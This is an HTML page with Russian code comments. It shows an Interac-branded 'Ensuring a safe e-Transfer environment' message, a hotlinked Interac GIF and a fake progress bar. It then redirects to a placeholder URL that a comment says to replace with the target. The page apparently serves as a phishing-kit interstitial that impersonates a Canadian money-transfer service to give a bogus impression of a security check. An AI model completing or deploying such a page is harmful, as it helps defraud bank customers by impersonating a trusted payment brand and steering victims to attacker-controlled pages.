<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Redirecting...</title>
  <style>
    body {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #f9f9f9;
    }
    img {
	  max-width: 50%; /* Изображение не будет шире контейнера */
	  height: auto; /* Высота автоматически рассчитывается, сохраняя пропорции */
	}
    .progress {
      margin-top: 20px;
      width: 80%;
      max-width: 400px;
      height: 20px;
      background-color: #e0e0e0;
      border-radius: 10px;
      overflow: hidden;
    }
    .progress-bar {
      height: 100%;
      width: 0;
      background-color: #76c7c0;
      transition: width 0.1s;
    }
    .percentage {
      margin-top: 10px;
      font-size: 16px;
    }
  </style>
  <style>
    .circle {
      display: inline-flex; /* Для центрирования текста */
      justify-content: center; /* Горизонтальное центрирование */
      align-items: center; /* Вертикальное центрирование */
      width: 15px; /* Ширина круга */
      height: 15px; /* Высота круга */
      border-radius: 50%; /* Делает элемент круглым */
      background-color: #f0f0f0; /* Фоновый цвет круга */
      border: 1px solid #ccc; /* Граница круга */
      font-size: 24px; /* Размер текста */
      font-weight: bold; /* Жирный текст */
      color: #333; /* Цвет текста */
    }
  </style>
</head>
<body>
  <img src="https://www.interac.ca/wp-content/uploads/2021/05/TrueFalse_GIF_05-4.gif" alt="Loading">
  <h4>Ensuring a safe <div class="circle">e</div>-Transfer environment</h4>
  <div class="progress">
    <div class="progress-bar" id="progress-bar"></div>
  </div>
  <div class="percentage" id="percentage">0%</div>

  <script>
    let progress = 0;
    const progressBar = document.getElementById('progress-bar');
    const percentage = document.getElementById('percentage');

    const interval = setInterval(() => {
      progress += 10;
      progressBar.style.width = progress + '%';
      percentage.textContent = progress + '%';

      if (progress >= 100) {
        clearInterval(interval);
        window.location.href = "#"; // Замените на целевой URL
      }
    }, 1100); // Задержка 1.1 сек.
  </script>
</body>
</html>
